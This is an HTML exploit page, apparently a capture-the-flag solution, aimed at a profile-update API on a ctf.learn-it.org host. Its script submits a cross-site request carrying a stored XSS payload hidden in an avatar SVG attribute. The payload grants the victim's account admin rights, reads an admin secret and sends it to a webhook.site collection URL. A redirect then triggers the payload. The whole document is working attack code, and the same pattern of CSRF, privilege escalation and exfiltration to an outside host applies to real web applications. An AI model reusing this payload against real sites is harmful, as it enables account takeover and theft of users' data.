<!DOCTYPE html>
<html>
<body>
<script>
// Step 1: Inject XSS payload
fetch('http://ctf.learn-it.org:39951/api/update-profile', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: JSON.stringify({
        avatar: {
            background: '"></svg><img src=x onerror="fetch(\'/api/update-profile\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},credentials:\'include\',body:JSON.stringify({isAdmin:true})}).then(()=>fetch(\'/api/admin/secret\',{credentials:\'include\'})).then(r=>r.json()).then(d=>new Image().src=\'https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?flag=\'+encodeURIComponent(d.flag))">'
        }
    })
}).then(() => {
    // Step 2: Redirect to dashboard to trigger XSS
    setTimeout(() => {
        location = 'http://ctf.learn-it.org:39951/dashboard';
    }, 1000);
});
</script>
</body>
</html>
